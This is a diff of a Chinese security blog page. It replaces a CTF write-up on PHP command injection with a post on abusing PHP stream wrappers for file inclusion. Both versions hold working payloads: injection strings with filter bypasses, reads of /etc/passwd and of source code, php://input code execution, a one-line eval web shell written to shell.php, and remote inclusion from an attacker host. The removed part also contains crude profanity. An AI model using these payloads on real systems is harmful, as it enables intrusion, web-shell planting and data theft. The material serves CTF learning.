@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>CTF之PHP命令执行 | 蹦蹦小圆帽の部落格</title>
+    <title>PHP伪协议 | 蹦蹦小圆帽の部落格</title>
     <meta name="author" content="蹦蹦小圆帽" />
     <meta name="description" content="这个世界灿烂盛大！" />
     <meta name="keywords" content="blog" />
@@ -163,14 +163,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CTF之PHP命令执行</h1>
+        <h1>PHP伪协议</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/11/20
+            2025/11/21
         </span>
         
         
@@ -189,22 +189,15 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00a596">
-                    渗透测试
-                </a>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/tags/PHP/" style="color: #00bcd4">
+                <a href="/tags/PHP/" style="color: #03a9f4">
                     PHP
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="color: #00a596">
-                    命令执行
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">
+                    网络安全
                 </a>
             </span>
             
@@ -213,100 +206,235 @@
     </div>
     
     <div class="content" v-pre>
-        <h1>PHP命令执行</h1>
-<h2 id="题目：BUUCTF-Ping-Ping-Ping">题目：BUUCTF Ping Ping Ping</h2>
-<h2 id="解题思路">解题思路</h2>
-<p>打开网页看到</p>
-<pre><code>/?ip=
+        <h1>PHP 伪协议</h1>
+<h2 id="file-协议"><code>file://</code> 协议</h2>
+<h3 id="利用条件">利用条件</h3>
+<ul>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include:off/on</li>
+</ul>
+<h3 id="作用">作用</h3>
+<p>使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_include的影响。</p>
+<p>这里有一点，当PHP里使用include()/require()/include_once()/require_once()参数可控的情况下，如导入一个非.php的文件，依然回按照php语法进行解析，这是include()函数的结果。</p>
+<blockquote>
+<p>file://文件系统是PHP使用的默认封装协议，展示了本地文件系统，file://它是使用了相对路径，一般来说脚本目录在什么目录下，其的起始路径就是改目录了。除非特意对默认路径做了修改，使用CLI的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen()和file_get_contents()、include_path会可选地进行搜索，也作为相对的路径。</p>
+</blockquote>
+<h3 id="用法">用法</h3>
+<p>file://绝对路径</p>
+<pre><code>http://target/include.php?file=file:///etc/passwd
 </code></pre>
-<p>可以看到直接GET请求一个IP，尝试</p>
-<pre><code>http://target/?ip=127.1
+<p>相对路径</p>
+<pre><code>http://target/include.php?file=./flag.php
 </code></pre>
-<p>返回</p>
-<pre><code>PING 127.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.031 ms
-64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.083 ms
-64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.056 ms
-64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.083 ms
+<p><a target="_blank" rel="noopener" href="http://xn--83t364h">http://路径</a></p>
+<pre><code>http://target/include.php?file=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<h2 id="php-协议"><code>php://</code>协议</h2>
+<h3 id="利用条件-2">利用条件</h3>
+<ul>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include:on/off</li>
+</ul>
+<p><strong>其中仅有php://input、php://stdin、php://memory、php://temp需要on</strong></p>
+<h3 id="作用-2">作用</h3>
+<p>php://访问各个I/O streams, php://filter读取源代码，而php://input用来做php代码执行。</p>
+<h3 id="php-filter-使用"><code>php://filter</code> 使用</h3>
+<p>该协议的参数会在该协议的路径上进行传递，多个参数都可以使用。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody>
+</table>
+<h4 id="常见过滤器类型">常见过滤器类型</h4>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string.rot13</td>
+<td>等同于str_rot13()，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于strtoupper()，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于strtolower()，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于strip_tags()，去除html、PHP语言标签</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于base64_encode()和base64_decode()，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody>
+</table>
+<h4 id="基本使用">基本使用</h4>
+<p><code>php://filter/read=convert.base64-encode/resource=文件名</code></p>
+<p>读取文件源码（针对php文件需要base64编码）</p>
+<p>例如：</p>
+<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
+</code></pre>
+<p><code>php://input + [POST DATA]</code></p>
+<p>执行PHP代码</p>
+<pre><code class="language-php">http://127.0.0.1/include.php?file=php://input
 
---- 127.1 ping statistics ---
-4 packets transmitted, 4 packets received, 0% packet loss
-round-trip min/avg/max = 0.031/0.063/0.083 ms
+&lt;?php system('ls');?&gt;
 </code></pre>
-<p>访问</p>
-<pre><code>http://target/?ip=127.1;ls
-</code></pre>
-<pre><code>/?ip=
+<p>写入一句话代码：</p>
+<pre><code class="language-php">http://127.0.0.1/include.php?file=php://input
 
-PING 127.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.037 ms
-64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.050 ms
-64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.062 ms
-64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.068 ms
+&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST['cmd']);?&gt;'; ?&gt;
+</code></pre>
+<h2 id="zip-bzip2-zlib-协议"><code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code>协议</h2>
+<h3 id="利用条件-3">利用条件</h3>
+<ul>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include :off/on</li>
+</ul>
+<h3 id="作用-3">作用</h3>
+<p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p>
+<h3 id="基本使用-2">基本使用</h3>
+<p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code></p>
+<p><em>(<code>%23</code>为<code>#</code>)</em></p>
+<pre><code>http://target/include.php?file=zip:///Hacking/flag.jpg%23flag.txt
+</code></pre>
+<p>这段代码的作用是：</p>
+<p>通过 file= 参数，利用 PHP ZIP 封装器，从伪装的 flag.jpg（其实是 zip）里读取 flag.txt，并让 include.php 输出其中内容</p>
+<ul>
+<li>打开 /Hacking/flag.jpg 这个 ZIP 文件，从中读取 flag.txt 内容</li>
+<li>然后 <code>include()</code> 把 flag.txt 的内容当成 PHP 代码执行 / 输出</li>
+</ul>
+<p>常见的用途：</p>
+<ol>
+<li>读取敏感文件（flag、配置文件等）</li>
+</ol>
+<pre><code>zip:///?file=/upload/avatar.png#flag.txt
+</code></pre>
+<ol start="2">
+<li>RCE（远程代码执行）</li>
+</ol>
+<p>攻击者上传 zip 内含 <code>shell.php</code> 然后包含它执行</p>
+<h3 id="compress-bzip2-file-bz2"><code>compress.bzip2://file.bz2</code></h3>
+<p>这个是压缩文件为file.bz2并且上传，注意也是绝对路径</p>
+<pre><code>http://target/include.php?file=compress.bzip2:///home/wanderer/phpinfo.bz2
+</code></pre>
+<h3 id="compress-zlib-file-gz"><code>compress.zlib://file.gz</code></h3>
+<p>压缩文件为file.gz并且上传，注意也是绝对路径</p>
+<pre><code>http://target/include.php?file=compress.zlib:///home/wanderer/phpinfo.gz
+</code></pre>
+<h2 id="data-协议"><code>data://</code> 协议</h2>
+<h3 id="利用条件-4">利用条件</h3>
+<ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ul>
+<h3 id="作用-4">作用</h3>
+<p>data://数据流封装器是从php5.2.0开始使用的。以此传递相应的格式的数据。经常被用来执行PHP代码。</p>
+<pre><code>data://text/plain,
+data://text/plain;base64,
+</code></pre>
+<h3 id="常见用法">常见用法</h3>
+<pre><code>http://target/include.php?file=data://text/plain,&lt;?php phpinfo();?&gt;
 
---- 127.1 ping statistics ---
-4 packets transmitted, 4 packets received, 0% packet loss
-round-trip min/avg/max = 0.037/0.054/0.068 ms
-flag.php
-index.php
+http://target/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 </code></pre>
-<p>可以看到目录下存在<code>flag.php</code>，傻子都知道肯定不可以直接访问flag.php，尝试使用<code>cat</code>命令查看之，返回</p>
-<pre><code>/?ip= fxck your flag!
+<h2 id="http-https-协议"><code>http://</code> &amp; <code>https://</code>协议</h2>
+<h3 id="利用条件-5">利用条件</h3>
+<ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ul>
+<h3 id="作用-5">作用</h3>
+<p>允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
+<h3 id="常见用法-2">常见用法</h3>
+<pre><code>http://target/include.php?file=http://hacker/phpinfo.txt
 </code></pre>
-<p>fuck尼玛！！！fuck you and fuck all of you</p>
-<p>接下来尝试使用通配符<code>*</code>，返回：</p>
-<pre><code>/?ip= 1fxck your symbol!
-</code></pre>
-<p>此时才想到先去看一下<code>index.php</code>，访问</p>
-<pre><code>http://target/?ip=127.1;cat$IFS$1index.php
-</code></pre>
-<p>得到<code>index.php</code>内容:</p>
-<pre><code class="language-php">/?ip=
-
-PING 127.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
-64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.049 ms
-64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.046 ms
-64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.049 ms
-
---- 127.1 ping statistics ---
-4 packets transmitted, 4 packets received, 0% packet loss
-round-trip min/avg/max = 0.030/0.043/0.049 ms
-/?ip=
-|\'|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
-    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
-    die(&quot;fxck your space!&quot;);
-  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
-    die(&quot;fxck your bash!&quot;);
-  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
-    die(&quot;fxck your flag!&quot;);
-  &#125;
-  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;
-
-&quot;;
-  print_r($a);
-&#125;
-</code></pre>
-<p>可以看到过滤挺全面哈。</p>
-<p>此时可以考虑定义一个变量<code>a=ag</code>，然后构造payload：</p>
-<pre><code>http://target/?ip=127.1;a=ag;cat$IFS$1fl$a.php
-</code></pre>
-<p>这次它终于不fuck了，在注释中找到flag</p>
-<pre><code class="language-php">$flag = &quot;flag&#123;ab6f245f-d55b-4d67-8cfb-ddf937f0bd48&#125;&quot;;
-</code></pre>
-<h2 id="附录：过滤空格方法">附录：过滤空格方法</h2>
-<pre><code class="language-bash">$IFS
-$&#123;IFS&#125;
-$IFS$1
-&lt;
-&lt;&gt;
-&#123;cat,flag.php&#125;
-%20
-%09
-</code></pre>
+<h2 id="phar-协议"><code>phar://</code> 协议</h2>
+<h3 id="作用-6">作用</h3>
+<p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容</p>
+<p><a target="_blank" rel="noopener" href="http://target/include.php?file=phar:///Hacking/phpinfo.zip/phpinfo.txt">http://target/include.php?file=phar:///Hacking/phpinfo.zip/phpinfo.txt</a></p>
+<h2 id="参考资料">参考资料</h2>
+<p><a target="_blank" rel="noopener" href="https://a1andns.github.io/post/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE">https://a1andns.github.io/post/PHP伪协议</a> 作者：A1andNS</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/686151790">https://zhuanlan.zhihu.com/p/686151790</a></p>
 
     </div>
     
